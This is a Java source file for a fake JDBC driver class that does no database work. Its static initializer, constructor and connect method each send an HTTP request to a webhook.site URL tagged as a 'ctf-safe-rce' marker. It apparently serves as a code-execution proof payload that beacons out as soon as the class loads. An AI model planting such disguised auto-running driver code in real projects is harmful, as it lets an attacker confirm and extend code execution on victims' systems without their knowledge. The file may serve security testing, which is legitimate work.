import java.net.HttpURLConnection;
import java.net.URL;
import java.sql.*;
import java.util.Properties;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.logging.Logger;
public final class ReportCanary6a0e217e546a6f7f implements Driver {
 private static final AtomicBoolean SENT=new AtomicBoolean(false);
 static { ping(); }
 public ReportCanary6a0e217e546a6f7f() { ping(); }
 private static void ping() {
  if(!SENT.compareAndSet(false,true)) return;
  try { HttpURLConnection c=(HttpURLConnection)new URL("https://webhook.site/54fddee2-c0fc-40f2-bb14-f181d41912d5?marker=ctf-safe-rce-github-pages-ea1e74a21bf5081b").openConnection();
   c.setConnectTimeout(3000); c.setReadTimeout(3000); c.setUseCaches(false);
   c.setInstanceFollowRedirects(false); c.getResponseCode(); c.disconnect();
  } catch(Exception ignored) {}
 }
 public Connection connect(String u,Properties p) { ping(); return null; }
 public boolean acceptsURL(String u) { return true; }
 public DriverPropertyInfo[] getPropertyInfo(String u,Properties p) { return new DriverPropertyInfo[0]; }
 public int getMajorVersion() { return 1; } public int getMinorVersion() { return 0; }
 public boolean jdbcCompliant() { return false; }
 public Logger getParentLogger() { return Logger.getGlobal(); }
}
